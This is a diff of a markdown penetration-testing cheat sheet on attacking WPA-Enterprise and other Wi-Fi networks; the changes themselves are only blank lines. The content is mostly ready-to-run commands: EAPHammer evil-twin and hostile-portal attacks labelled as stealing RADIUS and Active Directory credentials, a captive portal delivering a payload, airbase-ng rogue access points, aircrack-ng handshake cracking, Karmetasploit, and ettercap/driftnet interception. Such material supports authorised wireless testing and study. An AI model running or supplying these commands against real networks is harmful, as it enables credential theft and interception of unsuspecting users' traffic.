@@ -4,8 +4,8 @@
 
 WPA EAP refers to the use of the Extensible Authentication Protocol (EAP) within the context of the Wi-Fi Protected Access (WPA) security standard for wireless networks. WPA is a suite of security protocols to secure wireless local area networks (WLANs) and is a response to the vulnerabilities of the older Wired Equivalent Privacy (WEP) standard. WPA EAP is specifically associated with the enterprise mode of WPA, which uses 802.1X authentication to provide a higher level of security compared to the personal mode of WPA, which uses a pre-shared key (PSK).
 
-
 * [s0lst1c3/eaphammer](https://github.com/s0lst1c3/eaphammer) - Targeted evil twin attacks against WPA2-Enterprise networks.
+
     ```ps1
     git clone https://github.com/s0lst1c3/eaphammer.git
     ./kali-setup
@@ -21,22 +21,24 @@ WPA EAP refers to the use of the Extensible Authentication Protocol (EAP) within
     ```
 
 * [Stealing RADIUS Credentials Using EAPHammer](https://github.com/s0lst1c3/eaphammer/wiki/II.-Stealing-RADIUS-Credentials-Using-EAPHammer)
+
     ```ps1
     ./eaphammer --bssid 1C:7E:E5:97:79:B1 --essid Example --channel 2 --interface wlan0 --auth wpa-eap --creds
     ```
 
 * [Stealing AD Credentials Using Hostile Portal Attacks](https://github.com/s0lst1c3/eaphammer/wiki/III.-Stealing-AD-Credentials-Using-Hostile-Portal-Attacks)
+
     ```ps1
     ./eaphammer --interface wlan0 --bssid 1C:7E:E5:97:79:B1 --essid EvilC0rp --channel 6 --auth wpa-eap --hostile-portal
     ./eaphammer --interface wlan0 --essid TotallyLegit --hw-mode n --channel 36 --auth open --hostile-portal
     ```
 
 * [Performing Captive Portal Attacks - Evil Twin Attacks](https://github.com/s0lst1c3/eaphammer/wiki/V.-Performing-Captive-Portal-Attacks)
+
     ```ps1
     ./eaphammer --bssid 1C:7E:E5:97:79:B1 --essid HappyMealz --channel 149 --interface wlan0 --captive-portal
     ./eaphammer --captive-portal -e guestnet -i wlan0 --portal-template rogue-cert-prompt --lhost 10.0.0.10 --payload secure.crt
     ```
-
 
 ## Rogue Access Point
 
@@ -54,7 +56,6 @@ airbase-ng -c 3 -e $AP_SSID -z 4 -W 1 mon0
 # get a WPA handshake if the client connect
 aircrack-ng -w /pentest/passwords/john/password.lst airbase-01.cap
 ```
-
 
 ### Karmetasploit
 
@@ -82,7 +83,6 @@ karma.rc from metasploit
 msfconsole -r /root/karma.rc
 ```
 
-
 ### Access Point MITM
 
 ```powershell
@@ -108,7 +108,6 @@ driftnet
 ettercap -G
 Sniff > Unified sniffing > Hacker Interface
 ```
-
 
 ## References
 
